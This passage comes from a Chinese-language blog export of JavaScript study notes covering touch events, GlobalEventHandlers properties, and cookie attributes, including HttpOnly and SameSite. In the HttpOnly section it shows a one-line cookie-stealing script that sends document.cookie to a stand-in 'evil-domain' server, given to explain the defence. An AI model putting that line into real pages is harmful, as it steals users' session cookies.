<h6 id="（2）TouchEvent-changedTouches"><a href="#（2）TouchEvent-changedTouches" class="headerlink" title="（2）TouchEvent.changedTouches"></a>（2）TouchEvent.changedTouches</h6><p><code>TouchEvent.changedTouches</code>属性返回一个<code>TouchList</code>实例，成员是一组<code>Touch</code>实例对象，表示本次触摸事件的相关触摸点。</p>
<p>对于不同的时间，该属性的含义有所不同。</p>
<ul>
<li><code>touchstart</code>事件：被激活的触摸点</li>
<li><code>touchmove</code>事件：发生变化的触摸点</li>
<li><code>touchend</code>事件：消失的触摸点（即不再被触碰的点）</li>
</ul>
<p>下面是一个示例。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">someElement.addEventListener(<span class="string">&#x27;touchmove&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; e.changedTouches.length; i++) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e.changedTouches[i].identifier);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<h6 id="（3）TouchEvent-touches"><a href="#（3）TouchEvent-touches" class="headerlink" title="（3）TouchEvent.touches"></a>（3）TouchEvent.touches</h6><p><code>TouchEvent.touches</code>属性返回一个<code>TouchList</code>实例，成员是所有仍然处于活动状态（即触摸中）的触摸点。一般来说，一个手指就是一个触摸点。</p>
<p>下面是一个示例。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">someElement.addEventListener(<span class="string">&#x27;touchstart&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> (e.touches.length) &#123;</span><br><span class="line">    <span class="comment">// 一根手指触摸</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: handle_one_touch(e); <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">// 两根手指触摸</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>: handle_two_touches(e); <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">// 三根手指触摸</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>: handle_three_touches(e); <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">// 其他情况</span></span><br><span class="line">    <span class="keyword">default</span>: <span class="built_in">console</span>.log(<span class="string">&#x27;Not supported&#x27;</span>); <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<h6 id="（4）TouchEvent-targetTouches"><a href="#（4）TouchEvent-targetTouches" class="headerlink" title="（4）TouchEvent.targetTouches"></a>（4）TouchEvent.targetTouches</h6><p><code>TouchEvent.targetTouches</code>属性返回一个<code>TouchList</code>实例，成员是触摸事件的目标元素节点内部、所有仍然处于活动状态（即触摸中）的触摸点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">touches_in_target</span>(<span class="params">ev</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (ev.touches.length === ev.targetTouches.length ? <span class="literal">true</span> : <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码用来判断，是否所有触摸点都在目标元素内。</p>
<h4 id="8-5-触摸事件的种类"><a href="#8-5-触摸事件的种类" class="headerlink" title="8.5 触摸事件的种类"></a>8.5 触摸事件的种类</h4><p>触摸引发的事件，有以下几种。可以通过<code>TouchEvent.type</code>属性，查看到底发生的是哪一种事件。</p>
<ul>
<li><code>touchstart</code>：用户开始触摸时触发，它的<code>target</code>属性返回发生触摸的元素节点。</li>
<li><code>touchend</code>：用户不再接触触摸屏时（或者移出屏幕边缘时）触发，它的<code>target</code>属性与<code>touchstart</code>事件一致的，就是开始触摸时所在的元素节点。它的<code>changedTouches</code>属性返回一个<code>TouchList</code>实例，包含所有不再触摸的触摸点（即<code>Touch</code>实例对象）。</li>
<li><code>touchmove</code>：用户移动触摸点时触发，它的<code>target</code>属性与<code>touchstart</code>事件一致。如果触摸的半径、角度、力度发生变化，也会触发该事件。</li>
<li><code>touchcancel</code>：触摸点取消时触发，比如在触摸区域跳出一个模态窗口（modal window）、触摸点离开了文档区域（进入浏览器菜单栏）、用户的触摸点太多，超过了支持的上限（自动取消早先的触摸点）。</li>
</ul>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> el = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;canvas&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line">el.addEventListener(<span class="string">&#x27;touchstart&#x27;</span>, handleStart, <span class="literal">false</span>);</span><br><span class="line">el.addEventListener(<span class="string">&#x27;touchmove&#x27;</span>, handleMove, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleStart</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">  evt.preventDefault();</span><br><span class="line">  <span class="keyword">var</span> touches = evt.changedTouches;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; touches.length; i++) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(touches[i].pageX, touches[i].pageY);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleMove</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">  evt.preventDefault();</span><br><span class="line">  <span class="keyword">var</span> touches = evt.changedTouches;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; touches.length; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> touch = touches[i];</span><br><span class="line">    <span class="built_in">console</span>.log(touch.pageX, touch.pageY);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS 事件-触摸事件</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0054</title>
    <url>/2021/05/30/%E6%89%93%E5%8D%A10054/</url>
    <content><![CDATA[<p><font color=#65c294>生活就是这样，别人只看结果，自我独撑过程。</font></p>
<h2 id="JS-事件"><a href="#JS-事件" class="headerlink" title="JS 事件"></a>JS 事件</h2><h3 id="11-GlobalEventHandlers-接口"><a href="#11-GlobalEventHandlers-接口" class="headerlink" title="11. GlobalEventHandlers 接口"></a>11. GlobalEventHandlers 接口</h3><p>指定事件的回调函数，推荐使用的方法是元素的<code>addEventListener</code>方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">div.addEventListener(<span class="string">&#x27;click&#x27;</span>, clickHandler, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<p>除了之外，还有一种方法可以直接指定事件的回调函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">div.onclick = clickHandler;</span><br></pre></td></tr></table></figure>
<p>这个接口是由<code>GlobalEventHandlers</code>接口提供的。它的优点是使用比较方便，缺点是只能为每个事件指定一个回调函数，并且无法指定事件触发的阶段（捕获阶段还是冒泡阶段）。</p>
<p><code>HTMLElement</code>、<code>Document</code>和<code>Window</code>都继承了这个接口，也就是说，各种 HTML 元素、<code>document</code>对象、<code>window</code>对象上面都可以使用<code>GlobalEventHandlers</code>接口提供的属性。下面就列出这个接口提供的主要的事件属性。</p>
<h4 id="11-1-GlobalEventHandlers-onabort"><a href="#11-1-GlobalEventHandlers-onabort" class="headerlink" title="11.1 GlobalEventHandlers.onabort"></a>11.1 GlobalEventHandlers.onabort</h4><p> 某个对象的<code>abort</code>事件（停止加载）发生时，就会调用<code>onabort</code>属性指定的回调函数。</p>
<span id="more"></span>
<p>各种元素的停止加载事件，到底如何触发，目前并没有统一的规定。因此实际上，这个属性现在一般只用在<code>&lt;img&gt;</code>元素上面。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;img src=&quot;example.jpg&quot; id=&quot;img&quot;&gt;</span></span><br><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">img.onabort = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;image load aborted.&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="11-2-GlobalEventHandlers-onerror"><a href="#11-2-GlobalEventHandlers-onerror" class="headerlink" title="11.2 GlobalEventHandlers.onerror"></a>11.2 GlobalEventHandlers.onerror</h4><p><code>error</code>事件发生时，就会调用<code>onerror</code>属性指定的回调函数。</p>
<p><code>error</code>事件分成两种。</p>
<p>一种是 JavaScript 的运行时错误，这会传到<code>window</code>对象，导致<code>window.onerror()</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.onerror = <span class="function"><span class="keyword">function</span> (<span class="params">message, source, lineno, colno, error</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>window.onerror</code>的处理函数共接受五个参数，含义如下。</p>
<ul>
<li>message：错误信息字符串</li>
<li>source：报错脚本的 URL</li>
<li>lineno：报错的行号，是一个整数</li>
<li>colno：报错的列号，是一个整数</li>
<li>error： 错误对象</li>
</ul>
<p>另一种是资源加载错误，比如<code>&lt;img&gt;</code>或<code>&lt;script&gt;</code>加载的资源出现加载错误。这时，Error 对象会传到对应的元素，导致该元素的<code>onerror</code>属性开始执行。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">element.onerror = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意，一般来说，资源的加载错误不会触发<code>window.onerror</code>。</p>
<h4 id="11-3-GlobalEventHandlers-onload、GlobalEventHandlers-onloadstart"><a href="#11-3-GlobalEventHandlers-onload、GlobalEventHandlers-onloadstart" class="headerlink" title="11.3 GlobalEventHandlers.onload、GlobalEventHandlers.onloadstart"></a>11.3 GlobalEventHandlers.onload、GlobalEventHandlers.onloadstart</h4><p>元素完成加载时，会触发<code>load</code>事件，执行<code>onload()</code>。它的典型使用场景是<code>window</code>对象和<code>&lt;img&gt;</code>元素。对于<code>window</code>对象来说，只有页面的所有资源加载完成（包括图片、脚本、样式表、字体等所有外部资源），才会触发<code>load</code>事件。</p>
<p>对于<code>&lt;img&gt;</code>和<code>&lt;video&gt;</code>等元素，加载开始时还会触发<code>loadstart</code>事件，导致执行<code>onloadstart</code>。</p>
<h4 id="11-4-GlobalEventHandlers-onfocus，GlobalEventHandlers-onblur"><a href="#11-4-GlobalEventHandlers-onfocus，GlobalEventHandlers-onblur" class="headerlink" title="11.4 GlobalEventHandlers.onfocus，GlobalEventHandlers.onblur"></a>11.4 GlobalEventHandlers.onfocus，GlobalEventHandlers.onblur</h4><p>当前元素获得焦点时，会触发<code>element.onfocus</code>；失去焦点时，会触发<code>element.onblur</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">element.onfocus = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;onfocus event detected!&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line">element.onblur = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;onblur event detected!&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>注意，如果不是可以接受用户输入的元素，要触发<code>onfocus</code>，该元素必须有<code>tabindex</code>属性。</p>
<h4 id="11-5-GlobalEventHandlers-onscroll"><a href="#11-5-GlobalEventHandlers-onscroll" class="headerlink" title="11.5 GlobalEventHandlers.onscroll"></a>11.5 GlobalEventHandlers.onscroll</h4><p>页面或元素滚动时，会触发<code>scroll</code>事件，导致执行<code>onscroll()</code>。</p>
<h4 id="11-6-GlobalEventHandlers-oncontextmenu，GlobalEventHandlers-onshow"><a href="#11-6-GlobalEventHandlers-oncontextmenu，GlobalEventHandlers-onshow" class="headerlink" title="11.6 GlobalEventHandlers.oncontextmenu，GlobalEventHandlers.onshow"></a>11.6 GlobalEventHandlers.oncontextmenu，GlobalEventHandlers.onshow</h4><p>用户在页面上按下鼠标的右键，会触发<code>contextmenu</code>事件，导致执行<code>oncontextmenu()</code>。如果该属性执行后返回<code>false</code>，就等于禁止了右键菜单。<code>document.oncontextmenu</code>与<code>window.oncontextmenu</code>效果一样。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.oncontextmenu = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>oncontextmenu</code>属性执行后返回<code>false</code>，右键菜单就不会出现。</p>
<p>元素的右键菜单显示时，会触发该元素的<code>onshow</code>监听函数。</p>
<h4 id="11-7-其他的事件属性"><a href="#11-7-其他的事件属性" class="headerlink" title="11.7 其他的事件属性"></a>11.7 其他的事件属性</h4><p>鼠标的事件属性。</p>
<ul>
<li>onclick</li>
<li>ondblclick</li>
<li>onmousedown</li>
<li>onmouseenter</li>
<li>onmouseleave</li>
<li>onmousemove</li>
<li>onmouseout</li>
<li>onmouseover</li>
<li>onmouseup</li>
<li>onwheel</li>
</ul>
<p>键盘的事件属性。</p>
<ul>
<li>onkeydown</li>
<li>onkeypress</li>
<li>onkeyup</li>
</ul>
<p>焦点的事件属性。</p>
<ul>
<li>onblur</li>
<li>onfocus</li>
</ul>
<p>表单的事件属性。</p>
<ul>
<li>oninput</li>
<li>onchange</li>
<li>onsubmit</li>
<li>onreset</li>
<li>oninvalid</li>
<li>onselect</li>
</ul>
<p>触摸的事件属性。</p>
<ul>
<li>ontouchcancel</li>
<li>ontouchend</li>
<li>ontouchmove</li>
<li>ontouchstart</li>
</ul>
<p>拖动的事件属性分成两类：一类与被拖动元素相关，另一类与接收被拖动元素的容器元素相关。</p>
<p>被拖动元素的事件属性。</p>
<ul>
<li>ondragstart：拖动开始</li>
<li>ondrag：拖动过程中，每隔几百毫秒触发一次</li>
<li>ondragend：拖动结束</li>
</ul>
<p>接收被拖动元素的容器元素的事件属性。</p>
<ul>
<li>ondragenter：被拖动元素进入容器元素。</li>
<li>ondragleave：被拖动元素离开容器元素。</li>
<li>ondragover：被拖动元素在容器元素上方，每隔几百毫秒触发一次。</li>
<li>ondrop：松开鼠标后，被拖动元素放入容器元素。</li>
</ul>
<p><code>&lt;dialog&gt;</code>对话框元素的事件属性。</p>
<ul>
<li>oncancel</li>
<li>onclose</li>
</ul>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS 事件-GlobalEventHandlers 接口</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0058</title>
    <url>/2021/05/31/%E6%89%93%E5%8D%A10058/</url>
    <content><![CDATA[<p><font color=#6a6da9>“我拥向宇宙吹来的风 与夏夜相逢 是八月盛景 是清寂长生”</font></p>
<h2 id="JS-浏览器模型"><a href="#JS-浏览器模型" class="headerlink" title="JS 浏览器模型"></a>JS 浏览器模型</h2><h3 id="4-Cookie"><a href="#4-Cookie" class="headerlink" title="4. Cookie"></a>4. Cookie</h3><h4 id="4-1-概述"><a href="#4-1-概述" class="headerlink" title="4.1 概述"></a>4.1 概述</h4><p>Cookie 是服务器保存在浏览器的一小段文本信息，一般大小不能超过4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。</p>
<p>Cookie 主要保存状态信息，以下是一些主要用途。</p>
<ul>
<li>对话（session）管理：保存登录、购物车等需要记录的信息。</li>
<li>个性化信息：保存用户的偏好，比如网页的字体大小、背景色等等。</li>
<li>追踪用户：记录和分析用户行为。</li>
</ul>
<p>Cookie 不是一种理想的客户端储存机制。它的容量很小（4KB），缺乏数据操作接口，而且会影响性能。客户端储存应该使用 Web storage API 和 IndexedDB。只有那些每次请求都需要让服务器知道的信息，才应该放在 Cookie 里面。</p>
<p>每个 Cookie 都有以下几方面的元数据。</p>
<ul>
<li>Cookie 的名字</li>
<li>Cookie 的值（真正的数据写在这里面）</li>
<li>到期时间（超过这个时间会失效）</li>
<li>所属域名（默认为当前域名）</li>
<li>生效的路径（默认为当前网址）</li>
</ul>
<span id="more"></span>
<p>举例来说，用户访问网址<code>www.example.com</code>，服务器在浏览器写入一个 Cookie。这个 Cookie 的所属域名为<code>www.example.com</code>，生效路径为根路径<code>/</code>。如果 Cookie 的生效路径设为<code>/forums</code>，那么这个 Cookie 只有在访问<code>www.example.com/forums</code>及其子路径时才有效。以后，浏览器访问某个路径之前，就会找出对该域名和路径有效，并且还没有到期的 Cookie，一起发送给服务器。</p>
<p>用户可以设置浏览器不接受 Cookie，也可以设置不向服务器发送 Cookie。<code>window.navigator.cookieEnabled</code>属性返回一个布尔值，表示浏览器是否打开 Cookie 功能。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.navigator.cookieEnabled <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p><code>document.cookie</code>属性返回当前网页的 Cookie。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie <span class="comment">// &quot;id=foo;key=bar&quot;</span></span><br></pre></td></tr></table></figure>
<p>不同浏览器对 Cookie 数量和大小的限制，是不一样的。一般来说，单个域名设置的 Cookie 不应超过30个，每个 Cookie 的大小不能超过4KB。超过限制以后，Cookie 将被忽略，不会被设置。</p>
<p>浏览器的同源政策规定，两个网址只要域名相同，就可以共享 Cookie（参见《同源政策》一章）。注意，这里不要求协议相同。也就是说，<code>http://example.com</code>设置的 Cookie，可以被<code>https://example.com</code>读取。</p>
<h4 id="4-2-Cookie-与-HTTP-协议"><a href="#4-2-Cookie-与-HTTP-协议" class="headerlink" title="4.2 Cookie 与 HTTP 协议"></a>4.2 Cookie 与 HTTP 协议</h4><p>Cookie 由 HTTP 协议生成，也主要是供 HTTP 协议使用。</p>
<h5 id="4-2-1-HTTP-回应：Cookie-的生成"><a href="#4-2-1-HTTP-回应：Cookie-的生成" class="headerlink" title="4.2.1 HTTP 回应：Cookie 的生成"></a>4.2.1 HTTP 回应：Cookie 的生成</h5><p>服务器如果希望在浏览器保存 Cookie，就要在 HTTP 回应的头信息里面，放置一个<code>Set-Cookie</code>字段。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie:foo=bar</span><br></pre></td></tr></table></figure>
<p>上面代码会在浏览器保存一个名为<code>foo</code>的 Cookie，它的值为<code>bar</code>。</p>
<p>HTTP 回应可以包含多个<code>Set-Cookie</code>字段，即在浏览器生成多个 Cookie。下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">HTTP/<span class="number">1.0</span> <span class="number">200</span> OK</span><br><span class="line">Content-type: text/html</span><br><span class="line"><span class="built_in">Set</span>-Cookie: yummy_cookie=choco</span><br><span class="line"><span class="built_in">Set</span>-Cookie: tasty_cookie=strawberry</span><br><span class="line"></span><br><span class="line">[page content]</span><br></pre></td></tr></table></figure>
<p>除了 Cookie 的值，<code>Set-Cookie</code>字段还可以附加 Cookie 的属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Expires=&lt;date&gt;</span><br><span class="line"><span class="built_in">Set</span>-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Max-Age=&lt;non-zero-digit&gt;</span><br><span class="line"><span class="built_in">Set</span>-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;</span><br><span class="line"><span class="built_in">Set</span>-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Path=&lt;path-value&gt;</span><br><span class="line"><span class="built_in">Set</span>-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Secure</span><br><span class="line"><span class="built_in">Set</span>-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; HttpOnly</span><br></pre></td></tr></table></figure>
<p>上面的几个属性的含义，将在后文解释。</p>
<p>一个<code>Set-Cookie</code>字段里面，可以同时包括多个属性，没有次序的要求。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;; Secure; HttpOnly</span><br></pre></td></tr></table></figure>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: id=a3fWa; Expires=Wed, <span class="number">21</span> Oct <span class="number">2015</span> <span class="number">07</span>:<span class="number">28</span>:<span class="number">00</span> GMT; Secure; HttpOnly</span><br></pre></td></tr></table></figure>
<p>如果服务器想改变一个早先设置的 Cookie，必须同时满足四个条件：Cookie 的<code>key</code>、<code>domain</code>、<code>path</code>和<code>secure</code>都匹配。举例来说，如果原始的 Cookie 是用如下的<code>Set-Cookie</code>设置的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: key1=value1; domain=example.com; path=/blog</span><br></pre></td></tr></table></figure>
<p>改变上面这个 Cookie 的值，就必须使用同样的<code>Set-Cookie</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: key1=value2; domain=example.com; path=/blog</span><br></pre></td></tr></table></figure>
<p>只要有一个属性不同，就会生成一个全新的 Cookie，而不是替换掉原来那个 Cookie。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: key1=value2; domain=example.com; path=/</span><br></pre></td></tr></table></figure>
<p>上面的命令设置了一个全新的同名 Cookie，但是<code>path</code>属性不一样。下一次访问<code>example.com/blog</code>的时候，浏览器将向服务器发送两个同名的 Cookie。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Cookie: key1=value1; key1=value2</span><br></pre></td></tr></table></figure>
<p>上面代码的两个 Cookie 是同名的，匹配越精确的 Cookie 排在越前面。</p>
<h5 id="4-2-2-HTTP-请求：Cookie-的发送"><a href="#4-2-2-HTTP-请求：Cookie-的发送" class="headerlink" title="4.2.2 HTTP 请求：Cookie 的发送"></a>4.2.2 HTTP 请求：Cookie 的发送</h5><p>浏览器向服务器发送 HTTP 请求时，每个请求都会带上相应的 Cookie。也就是说，把服务器早前保存在浏览器的这段信息，再发回服务器。这时要使用 HTTP 头信息的<code>Cookie</code>字段。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Cookie: foo=bar</span><br></pre></td></tr></table></figure>
<p>上面代码会向服务器发送名为<code>foo</code>的 Cookie，值为<code>bar</code>。</p>
<p><code>Cookie</code>字段可以包含多个 Cookie，使用分号（<code>;</code>）分隔。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Cookie: name=value; name2=value2; name3=value3</span><br></pre></td></tr></table></figure>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">GET /sample_page.html HTTP/<span class="number">1.1</span></span><br><span class="line">Host: www.example.org</span><br><span class="line">Cookie: yummy_cookie=choco; tasty_cookie=strawberry</span><br></pre></td></tr></table></figure>
<p>服务器收到浏览器发来的 Cookie 时，有两点是无法知道的。</p>
<ul>
<li>Cookie 的各种属性，比如何时过期。</li>
<li>哪个域名设置的 Cookie，到底是一级域名设的，还是某一个二级域名设的。</li>
</ul>
<h4 id="4-3-Cookie-的属性"><a href="#4-3-Cookie-的属性" class="headerlink" title="4.3 Cookie 的属性"></a>4.3 Cookie 的属性</h4><h5 id="4-3-1-Expires，Max-Age"><a href="#4-3-1-Expires，Max-Age" class="headerlink" title="4.3.1 Expires，Max-Age"></a>4.3.1 Expires，Max-Age</h5><p><code>Expires</code>属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 Cookie。它的值是 UTC 格式，可以使用<code>Date.prototype.toUTCString()</code>进行格式转换。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: id=a3fWa; Expires=Wed, <span class="number">21</span> Oct <span class="number">2015</span> <span class="number">07</span>:<span class="number">28</span>:<span class="number">00</span> GMT;</span><br></pre></td></tr></table></figure>
<p>如果不设置该属性，或者设为<code>null</code>，Cookie 只在当前会话（session）有效，浏览器窗口一旦关闭，当前 Session 结束，该 Cookie 就会被删除。另外，浏览器根据本地时间，决定 Cookie 是否过期，由于本地时间是不精确的，所以没有办法保证 Cookie 一定会在服务器指定的时间过期。</p>
<p><code>Max-Age</code>属性指定从现在开始 Cookie 存在的秒数，比如<code>60 * 60 * 24 * 365</code>（即一年）。过了这个时间以后，浏览器就不再保留这个 Cookie。</p>
<p>如果同时指定了<code>Expires</code>和<code>Max-Age</code>，那么<code>Max-Age</code>的值将优先生效。</p>
<p>如果<code>Set-Cookie</code>字段没有指定<code>Expires</code>或<code>Max-Age</code>属性，那么这个 Cookie 就是 Session Cookie，即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个 Cookie。</p>
<h5 id="4-3-2-Domain，Path"><a href="#4-3-2-Domain，Path" class="headerlink" title="4.3.2 Domain，Path"></a>4.3.2 Domain，Path</h5><p><code>Domain</code>属性指定浏览器发出 HTTP 请求时，哪些域名要附带这个 Cookie。如果没有指定该属性，浏览器会默认将其设为当前域名，这时子域名将不会附带这个 Cookie。比如，<code>example.com</code>不设置 Cookie 的<code>domain</code>属性，那么<code>sub.example.com</code>将不会附带这个 Cookie。如果指定了<code>domain</code>属性，那么子域名也会附带这个 Cookie。如果服务器指定的域名不属于当前域名，浏览器会拒绝这个 Cookie。</p>
<p><code>Path</code>属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只要浏览器发现，<code>Path</code>属性是 HTTP 请求路径的开头一部分，就会在头信息里面带上这个 Cookie。比如，<code>PATH</code>属性是<code>/</code>，那么请求<code>/docs</code>路径也会包含该 Cookie。当然，前提是域名必须一致。</p>
<h5 id="4-3-3-Secure，HttpOnly"><a href="#4-3-3-Secure，HttpOnly" class="headerlink" title="4.3.3 Secure，HttpOnly"></a>4.3.3 Secure，HttpOnly</h5><p><code>Secure</code>属性指定浏览器只有在加密协议 HTTPS 下，才能将这个 Cookie 发送到服务器。另一方面，如果当前协议是 HTTP，浏览器会自动忽略服务器发来的<code>Secure</code>属性。该属性只是一个开关，不需要指定值。如果通信是 HTTPS 协议，该开关自动打开。</p>
<p><code>HttpOnly</code>属性指定该 Cookie 无法通过 JavaScript 脚本拿到，主要是<code>document.cookie</code>属性、<code>XMLHttpRequest</code>对象和 Request API 都拿不到该属性。这样就防止了该 Cookie 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 Cookie。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">new</span> Image()).src = <span class="string">&quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot;</span> + <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure>
<p>上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 Cookie 发往第三方服务器。如果设置了一个 Cookie 的<code>HttpOnly</code>属性，上面代码就不会读到该 Cookie。</p>
<h5 id="4-3-4-SameSite"><a href="#4-3-4-SameSite" class="headerlink" title="4.3.4 SameSite"></a>4.3.4 SameSite</h5><p>Chrome 51 开始，浏览器的 Cookie 新增加了一个<code>SameSite</code>属性，用来防止 CSRF 攻击和用户追踪。</p>
<p>Cookie 往往用来存储用户的身份信息，恶意网站可以设法伪造带有正确 Cookie 的 HTTP 请求，这就是 CSRF 攻击。举例来说，用户登陆了银行网站<code>your-bank.com</code>，银行服务器发来了一个 Cookie。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie:id=a3fWa;</span><br></pre></td></tr></table></figure>
<p>用户后来又访问了恶意网站<code>malicious.com</code>，上面有一个表单。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;your-bank.com/transfer&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">  ...</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>用户一旦被诱骗发送这个表单，银行网站就会收到带有正确 Cookie 的请求。为了防止这种攻击，表单一般都带有一个随机 token，告诉服务器这是真实请求。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;your-bank.com/transfer&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;token&quot;</span> value=<span class="string">&quot;dad3weg34&quot;</span>&gt;</span><br><span class="line">  ...</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>这种第三方网站引导发出的 Cookie，就称为第三方 Cookie。它除了用于 CSRF 攻击，还可以用于用户追踪。比如，Facebook 在第三方网站插入一张看不见的图片。</p>
